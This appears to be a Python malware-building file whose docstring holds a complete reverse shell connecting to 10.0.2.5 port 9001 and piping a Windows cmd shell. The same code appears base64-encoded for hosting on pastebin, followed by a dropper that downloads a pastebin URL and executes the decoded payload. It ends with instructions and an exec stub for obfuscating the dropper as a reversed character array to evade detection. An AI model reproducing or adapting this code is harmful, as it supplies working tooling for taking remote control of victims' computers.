"""
This dropper fetches the following obfuscated reverse shell from pastebin:

1. Original reverse shell code:

import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.5",9001))

p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()

2. Obfuscated reverse shell code (paste it to pastebin):
aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzLHRocmVhZGluZzsKZGVmIHMycChzLCBwKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgICAgIGlmIGxlbihkYXRhKSA+IDA6CiAgICAgICAgICAgIHAuc3RkaW4ud3JpdGUoZGF0YSkKICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpCgpkZWYgcDJzKHMsIHApOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMi41Iiw5MDAxKSkKCnA9c3VicHJvY2Vzcy5Qb3BlbihbImNtZCJdLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkKCnMycF90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zMnAsIGFyZ3M9W3MsIHBdKQpzMnBfdGhyZWFkLmRhZW1vbiA9IFRydWUKczJwX3RocmVhZC5zdGFydCgpCgpwMnNfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cDJzLCBhcmdzPVtzLCBwXSkKcDJzX3RocmVhZC5kYWVtb24gPSBUcnVlCnAyc190aHJlYWQuc3RhcnQoKQoKdHJ5OgogICAgcC53YWl0KCkKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgcy5jbG9zZSgp

3. The following code is an original dropper that needs to be obfuscated:

import urllib.request, base64

def fetch_and_execute(url):
    try:
        with urllib.request.urlopen(url) as response:
            code = response.read().decode("utf-8")
            exec(base64.b64decode(code))
    except Exception as e:
        print(f"An error occurred: {e}")

pastebin_url = "https://pastebin.com/raw/dmKPBdQH"
fetch_and_execute(pastebin_url)

4. Convert it into reverse base64 and then into reverse list of Unicode chars.
5. Once converted place the content of array into arr list.
"""

import base64
arr = []
exec(base64.b64decode("".join(chr(i) for i in [][::-1])[::-1]).decode("utf-8"))

